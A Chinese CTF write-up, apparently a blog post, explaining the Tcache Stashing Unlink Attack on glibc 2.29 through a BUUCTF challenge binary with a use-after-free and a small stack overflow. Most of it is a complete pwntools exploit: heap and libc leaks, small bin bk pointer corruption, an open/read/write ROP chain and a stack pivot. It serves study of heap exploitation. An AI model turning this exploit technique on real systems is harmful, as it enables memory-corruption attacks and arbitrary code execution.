**Tcache Stashing Unlink Attack利用了House of Lore的一些手段，两者都是利用了small bin**

# House of Lore 
>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。 
House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。
 House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。
# Tcache Stashing Unlink Attack
>利用特性：
	1.tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中
	2.calloc函数分配堆块时不从tcache bin中选取。
	3.修改一个small bin的bk指针时，就可以实现在任意地址上写一个libc地址，构造得当可以往任意地址申请chunk，实现任意地址写

 利用前提
	
	1.能控制 Small Bin Chunk 的 bk 指针。
	
	2.程序可以越过Tache取Chunk。(使用calloc即可做到)
	
	3.程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。

# 例题 BUUCTF-[2020 新春红包题]3

![在这里插入图片描述](https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png)
未开启canary保护，可能存在栈溢出

 ## main函数
程序实现四个功能，增，删，查，改，还有一个栈溢出的函数


	void __fastcall __noreturn main(char *a1, char **a2, char **a3)
	{
	  char v3[268]; // [rsp+0h] [rbp-110h] BYREF
	  int v4; // [rsp+10Ch] [rbp-4h]
	
	  v4 = 0;
	  sub_11D5();
	  sub_1450();
	  sub_1269();
	  while ( 1 )
	  {
	    while ( 1 )
	    {
	      while ( 1 )
	      {
	        menu();
	        v4 = readd();
	        if ( v4 != 3 )
	          break;
	        a1 = v3;
	        edit(v3, a2);
	      }
	      if ( v4 > 3 )
	        break;
	      if ( v4 == 1 )
	      {
	        if ( x1c <= 0 )
	          exitt();
	        a1 = v3;
	        add(v3);
	        --x1c;
	      }
	      else
	      {
	        if ( v4 != 2 )
	          goto LABEL_19;
	        a1 = v3;
	        delete(v3);
	      }
	    }
	    if ( v4 == 5 )
	      exitt();
	    if ( v4 < 5 )
	    {
	      a1 = v3;
	      show(v3);
	    }
	    else
	    {
	      if ( v4 != 666 )
	LABEL_19:
	        exitt();
	      stack_attack(a1, a2);
	    }
	  }
	}
## add函数
申请chunk，会指定chunk的序号，最大为16，且只能申请四种chunk，1.0x10 2.0xf0 3.0x300 4.0x400，并且是calloc函数分配堆块，chunk不会从tcache bin中取。

	int __fastcall sub_1515(__int64 a1)
	{
	  int v2; // [rsp+10h] [rbp-20h]
	  int v3; // [rsp+14h] [rbp-1Ch]
	  unsigned int v4; // [rsp+18h] [rbp-18h]
	  int size; // [rsp+1Ch] [rbp-14h]
	
	  printf("Please input the red packet idx: ");
	  v4 = readd();
	  if ( v4 > 0x10 )
	    exitt();
	  printf("How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ");
	  v3 = readd();
	  if ( v3 == 2 )
	  {
	    size = 0xF0;
	  }
	  else if ( v3 > 2 )
	  {
	    if ( v3 == 3 )
	    {
	      size = 0x300;
	    }
	    else
	    {
	      if ( v3 != 4 )
	        goto LABEL_14;
	      size = 0x400;
	    }
	  }
	  else
	  {
	    if ( v3 != 1 )
	    {
	LABEL_14:
	      size = 0;
	      goto LABEL_15;
	    }
	    size = 16;
	  }
	LABEL_15:
	  if ( size != 0x10 && size != 0xF0 && size != 0x300 && size != 0x400 )
	    exitt();
	  *(16LL * v4 + a1) = calloc(1uLL, size);
	  *(a1 + 16LL * v4 + 8) = size;
	  printf("Please input content: ");
	  v2 = read(0, *(16LL * v4 + a1), *(16LL * v4 + a1 + 8));
	  if ( v2 <= 0 )
	    exitt();
	  *(v2 - 1LL + *(16LL * v4 + a1)) = 0;
	  return puts("Done!");
	}

## delete函数
存在UAF

	int __fastcall delete(__int64 a1)
	{
	  unsigned int v2; // [rsp+1Ch] [rbp-4h]
	
	  printf("Please input the red packet idx: ");
	  v2 = readd();
	  if ( v2 > 0x10 || !*(16LL * v2 + a1) )
	    exitt();
	  free(*(16LL * v2 + a1));                      // uaf
	                                                // 
	  return puts("Done!");
	}

## edit函数
编辑的次数受qword_4010控制，qword_4010为1，只能编辑1次

	int __fastcall sub_1740(__int64 a1, __int64 a2)
	{
	  void *v2; // rsi
	  int v4; // [rsp+18h] [rbp-8h]
	  unsigned int v5; // [rsp+1Ch] [rbp-4h]
	
	  if ( qword_4010 <= 0 )
	    exitt(a1, a2);
	  --qword_4010;
	  printf("Please input the red packet idx: ");
	  v5 = readd();
	  if ( v5 > 0x10 || !*(16LL * v5 + a1) )
	    exitt("Please input the red packet idx: ", a2);
	  printf("Please input content: ");
	  v2 = *(16LL * v5 + a1);
	  v4 = read(0, v2, *(16LL * v5 + a1 + 8));
	  if ( v4 <= 0 )
	    exitt(0LL, v2);
	  *(v4 - 1LL + *(16LL * v5 + a1)) = 0;
	  return puts("Done!");
	}
![在这里插入图片描述](https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png)
## show函数

	int __fastcall sub_184E(__int64 a1)
	{
	  unsigned int v2; // [rsp+1Ch] [rbp-4h]
	
	  printf("Please input the red packet idx: ");
	  v2 = readd();
	  if ( v2 > 0x10 || !*(16LL * v2 + a1) )
	    exitt();
	  puts(*(16LL * v2 + a1));
	  return puts("Done!");
	}
## 栈溢出函数
执行栈溢出函数需要满足*(first_chunk + 2048)> 0x7F0000000000且*(first_chunk + 2040) 和 *(first_chunk + 2056)值为0。first_chunk就是我们申请的第一个chunk。
	
	ssize_t sub_13BD()
	{
	  char buf[128]; // [rsp+0h] [rbp-80h] BYREF
	
	  if ( *(first_chunk + 2048) <= 0x7F0000000000LL || *(first_chunk + 2040) || *(first_chunk + 2056) )
	    exitt();
	  puts("You get red packet!");
	  printf("What do you want to say?");
	  return read(0, buf, 0x90uLL);
	}

# 思路
因为存在一个栈溢出的漏洞，我们可以使用堆ROP，而要想利用栈溢出漏洞需要将*(first_chunk + 2048)修改为一个大于0x7F0000000000的值，而*(first_chunk + 2040)和 *(first_chunk + 2056)本来就是0，保持不变即可。calloc函数分配堆块，chunk不会从tcache bin中取。程序至少可以分配两种不同大小且大小为unsorted bin的Chunk（0x300和0x400）。这里我们可以使用Tcache Stashing Unlink Attack。

# 调试过程
先把前面的写好

	# coding=utf-8
	from pwn import *
	context(endian='little',os='linux',arch='amd64',log_level='debug') 
	
	sh = process('./RedPacket_SoEasyPwn1')
	#sh = remote('node4.buuoj.cn','27283')
	
	libc=ELF("./libc-2.29.so")
	
	 
	 
	
	s       = lambda data               :sh.send(data)
	sa      = lambda delim,data         :sh.sendafter(delim, data)
	sl      = lambda data               :sh.sendline(data)
	sla     = lambda delim,data         :sh.sendlineafter(delim, data)
	r       = lambda num=4096           :sh.recv(num)
	ru      = lambda delims		    :sh.recvuntil(delims)
	itr     = lambda                    :sh.interactive()
	uu32    = lambda data               :u32(data.ljust(4,'\0'))
	uu64    = lambda data               :u64(data.ljust(8,'\0'))
	leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
	lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
	def dbg():
	        gdb.attach(sh)
	        pause()
	 
	
	def add(index,chunk_size_index,value):
	    ru('Your input: ')
	    sl('1')
	    ru('Please input the red packet idx: ')
	    sl(str(index))
	    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')
	    sl(str(chunk_size_index))
	    ru('Please input content: ')
	    sl(value)
	
	def free(index):
	    ru('Your input: ')
	    sl('2')
	    ru('Please input the red packet idx: ')
	    sl(str(index))
	
	def edit(index,value):
	    ru('Your input: ')
	    sl('3')
	    ru('Please input the red packet idx: ')
	    sl(str(index))
	    ru('Please input content: ')
	    sl(value)
	
	def show(index):
	    ru('Your input: ')
	    sl('4')
	    ru('Please input the red packet idx: ')
	    sl(str(index))
	
## 构造tcache bin
首先我们要获得unsorted bin的chunk，需要先填满0x400大小的tcache bin，填0x300大小的tcache bin只剩1个

	#1.0x10 2.0xf0 3.0x300 4.0x400
	for i in range(7):
	    add(15,4,'Chunk_15')
	    free(15)
	
	for i in range(6):
	    add(14,2,'Chunk_14')
	    free(14)
	
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png)
此时我们利用UAF可以泄露出heap地址

	show(15)
	last_chunk_addr = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00'))
	lg('last_chunk_addr',last_chunk_addr)
	heap_addr = last_chunk_addr - 0x26C0
	lg('heap_addr',heap_addr)
	dbg()

![在这里插入图片描述](https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png)

## 利用unsorted bin构造两个small bin chunk
>当我们申请一个chunk时，如果unsorted bin里有chunk，而我们所申请的chunk大小小于unsorted bin里的chunk，那么就把unsorted bin的chunk分割，拿出我们需要的大小申请chunk，剩下的继续留在unsorted bin中，
>而如果我们申请的chunk大小大于unsorted bin中的chunk，那么就会把unsorted bin中的chunk，按照大小放入对应的bin中，之后再从top chunk中申请一个chunk。

我们可以先申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），之后free  大小为0x400的chunk，再申请两次0x300大小的chunk，第一次申请的chunk会从0x400大小的chunk里切割出0x300，unsorted bin还剩0x100大小的chunk，第二次申请的chunk由于大于unsorted bin中的chunk，会将unsorted bin中的0x100大小的chunk放进small bin，我们利用同样的方法可以再次得到一个small bin的chunk，这样我们就得到了两个small bin chunk。

申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），可以看到tcachebin中的chunk没有被拿走。

	add(1,4,'Chunk_1')
	add(13,3,'Chunk_13')
	
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png)
我们free chunk1，因为chunk1大小为0x400，tcachebin中0x400大小的chunk已满了7个，所以进入unsorted bin，利用UAF泄露libc基地址

	free(1)
	show(1)
	libc_base = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00')) - 0x1E4CA0
	lg('libc_base',libc_base)
	dbg()

![在这里插入图片描述](https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png)
申请0x300大小的chunk，在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100
	
	add(13,3,'Chunk_13')
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png)

在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk，成功制造一个small bin chunk

	add(13,3,'Chunk_13')
	
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png)
利用同样方法再构造一个small bin chunk

 
	add(2,4,'Chunk_2')
	add(13,4,'Chunk_13')
	
	#dbg()
	
	free(2)
	
	#dbg()
	
	add(13,3,'Chunk_13')
	add(13,3,'Chunk_13')
	
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png)

并借此我们找到size大小为0x1010的就是first_chunk，借此我们算出刚刚泄露出的heap+ 0x250+0x10+0x800-0x10就是first_chunk+0x800的地址，small bin chunk2的fd指针指向small bin chunk1不变，所以我们还要算出small bin chunk1距离heap的距离0x37e0

## 修改small bin chunk的bk指针为first_chunk+0x800


	payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)
	edit(2,payload)
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png)
再次申请0x100大小的chunk，程序仅会检查Chunk2的fd指针是否指向Chunk1，在取出Chunk1后，因为0x100的Tcache Bin还有1个空位，程序会遍历发现Chunk2满足大小条件并将其放入Tcache Bin中，我们若此时篡改Chunk2的bk指针指向first_chunk+0x800，触发Tcache Stashing Unlink Attack将main_arena+336写入first_chunk+0x800，满足first_chunk+0x800大于0x7F0000000000.

![在这里插入图片描述](https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png)
## 构造ORW的ROP链放入堆块中
先获取一些gadget段，	file_name_addr是我们要申请的下一个chunk的mem地址，也就是当前的top chunk的mem地址，距离heap  0x0000000000004A40


	pop_rdi_ret = libc_base + 0x0000000000026542
	pop_rsi_ret = libc_base + 0x0000000000026f9e
	pop_rdx_ret = libc_base + 0x000000000012bda6
	file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置
	flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容
	ROP_chain  = '/flag\x00\x00\x00'

open(file_name_addr,0)

	ROP_chain += p64(pop_rdi_ret)
	ROP_chain += p64(file_name_addr)
	ROP_chain += p64(pop_rsi_ret)
	ROP_chain += p64(0)
	ROP_chain += p64(libc_base+libc.symbols['open'])

read(3,flag_addr,0x40)
Read函数的第一个参数文件描述符从0开始累加，
程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，
这样在程序中，每打开一个文件，文件描述符值从3开始累加。
我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件
read函数第一个参数是3，就是在这个文件里读取数据。

	ROP_chain += p64(pop_rdi_ret)
	ROP_chain += p64(3)
	ROP_chain += p64(pop_rsi_ret)
	ROP_chain += p64(flag_addr)
	ROP_chain += p64(pop_rdx_ret)
	ROP_chain += p64(0x40)
	ROP_chain += p64(libc_base+libc.symbols['read'])
write(1,flag_addr,0x40)

	ROP_chain += p64(pop_rdi_ret)
	ROP_chain += p64(1)
	ROP_chain += p64(pop_rsi_ret)
	ROP_chain += p64(flag_addr)
	ROP_chain += p64(pop_rdx_ret)
	ROP_chain += p64(0x40)
	ROP_chain += p64(libc_base+libc.symbols['write'])

申请chunk，将ROP链写到chunk里

	add(4,4,ROP_chain)
	
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png)
## 栈迁移
利用read(0, buf, 0x90uLL);buf0x80字节，正好可以溢出0x10字节，进行栈迁移，将程序迁移到我们最新申请的chunk处执行我们的ROP链。
![在这里插入图片描述](https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png)


	leave_ret = libc_base + 0x0000000000058373
	ru('Your input: ')
	sl('666')
	ru('What do you want to say?')
	#栈迁移
	sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))

	itr()

## exp

	# coding=utf-8
	from pwn import *
	context(endian='little',os='linux',arch='amd64',log_level='debug') 
	
	sh = process('./RedPacket_SoEasyPwn1')
	#sh = remote('node4.buuoj.cn','27283')
	
	libc=ELF("./libc-2.29.so")
	
	 
	 
	
	s       = lambda data               :sh.send(data)
	sa      = lambda delim,data         :sh.sendafter(delim, data)
	sl      = lambda data               :sh.sendline(data)
	sla     = lambda delim,data         :sh.sendlineafter(delim, data)
	r       = lambda num=4096           :sh.recv(num)
	ru      = lambda delims		    :sh.recvuntil(delims)
	itr     = lambda                    :sh.interactive()
	uu32    = lambda data               :u32(data.ljust(4,'\0'))
	uu64    = lambda data               :u64(data.ljust(8,'\0'))
	leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
	lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
	def dbg():
	        gdb.attach(sh)
	        pause()
	 
	
	def add(index,chunk_size_index,value):
	    ru('Your input: ')
	    sl('1')
	    ru('Please input the red packet idx: ')
	    sl(str(index))
	    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')
	    sl(str(chunk_size_index))
	    ru('Please input content: ')
	    sl(value)
	
	def free(index):
	    ru('Your input: ')
	    sl('2')
	    ru('Please input the red packet idx: ')
	    sl(str(index))
	
	def edit(index,value):
	    ru('Your input: ')
	    sl('3')
	    ru('Please input the red packet idx: ')
	    sl(str(index))
	    ru('Please input content: ')
	    sl(value)
	
	def show(index):
	    ru('Your input: ')
	    sl('4')
	    ru('Please input the red packet idx: ')
	    sl(str(index))
	
	
	 
	
	#1.0x10 2.0xf0 3.0x300 4.0x400
	for i in range(7):
	    add(15,4,'Chunk_15')
	    free(15)
	
	
	
	for i in range(6):
	    add(14,2,'Chunk_14')
	    free(14)
	
	#dbg()
	
	show(15)
	last_chunk_addr = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00'))
	lg('last_chunk_addr',last_chunk_addr)
	heap_addr = last_chunk_addr - 0x26C0
	lg('heap_addr',heap_addr)
	
	#dbg()
	
	add(1,4,'Chunk_1')
	add(13,3,'Chunk_13')
	
	#dbg()
	
	free(1)
	show(1)
	libc_base = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00')) - 0x1E4CA0
	lg('libc_base',libc_base)
	
	
	#dbg()
	
	#在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100
	add(13,3,'Chunk_13')
	
	
	#dbg()
	
	#在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk
	add(13,3,'Chunk_13')
	
	#dbg()
	
	#在申请一个0x400大小的chunk，再制造一个0x100的smallbin的chunk
	add(2,4,'Chunk_2')
	#申请一个chunk防止合并
	add(13,4,'Chunk_13')
	
	#dbg()
	
	free(2)
	
	#dbg()
	
	add(13,3,'Chunk_13')
	add(13,3,'Chunk_13')
	
	#dbg()
	
	payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)
	edit(2,payload)
	
	#dbg()
	
	add(3,2,'Chunk_3')
	lg('heap_addr',heap_addr)
	
	#dbg()
	
	#ORW
	pop_rdi_ret = libc_base + 0x0000000000026542
	pop_rsi_ret = libc_base + 0x0000000000026f9e
	pop_rdx_ret = libc_base + 0x000000000012bda6
	file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置
	flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容
	ROP_chain  = '/flag\x00\x00\x00'
	#open(file_name_addr,0)
	ROP_chain += p64(pop_rdi_ret)
	ROP_chain += p64(file_name_addr)
	ROP_chain += p64(pop_rsi_ret)
	ROP_chain += p64(0)
	ROP_chain += p64(libc_base+libc.symbols['open'])
	#read(3,flag_addr,0x40)
	#Read函数的第一个参数文件描述符从0开始累加，
	#程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，
	#这样在程序中，每打开一个文件，文件描述符值从3开始累加。
	#我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件
	#read函数第一个参数是3，就是在这个文件里读取数据。
	ROP_chain += p64(pop_rdi_ret)
	ROP_chain += p64(3)
	ROP_chain += p64(pop_rsi_ret)
	ROP_chain += p64(flag_addr)
	ROP_chain += p64(pop_rdx_ret)
	ROP_chain += p64(0x40)
	ROP_chain += p64(libc_base+libc.symbols['read'])
	#write(1,flag_addr,0x40)
	ROP_chain += p64(pop_rdi_ret)
	ROP_chain += p64(1)
	ROP_chain += p64(pop_rsi_ret)
	ROP_chain += p64(flag_addr)
	ROP_chain += p64(pop_rdx_ret)
	ROP_chain += p64(0x40)
	ROP_chain += p64(libc_base+libc.symbols['write'])
	
	add(4,4,ROP_chain)
	
	#dbg()
	
	leave_ret = libc_base + 0x0000000000058373
	ru('Your input: ')
	sl('666')
	ru('What do you want to say?')
	#栈迁移
	sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))
	
	#dbg()
	itr()

